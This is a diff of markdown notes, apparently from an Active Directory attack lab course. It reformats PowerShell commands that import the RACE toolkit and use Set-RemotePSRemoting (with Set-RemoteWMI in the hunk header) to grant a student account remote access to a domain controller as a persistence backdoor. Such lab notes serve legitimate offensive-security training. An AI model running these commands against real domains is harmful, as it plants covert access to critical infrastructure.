@@ -641,16 +641,20 @@ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\ci
 
 
 
-```
+```powershell
+# First of all run (to import RACE Toolikit) -:
 
+C:\AD\Tools\RACE-master\RACE.ps1
 
+#• On local machine for student1:
 
-• On local machine for student1:
 Set-RemotePSRemoting -SamAccountName student1 -Verbose
-• On remote machine for student1 without credentials:
-Set-RemotePSRemoting -SamAccountName student1 -ComputerName
-dcorp-dc -Verbose
-• On remote machine, remove the permissions:
-Set-RemotePSRemoting -SamAccountName student1 -ComputerName
-dcorp-dc -Remove
+
+#• On remote machine for student1 without credentials:
+
+Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
+
+#• On remote machine, remove the permissions:
+
+Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
 ```
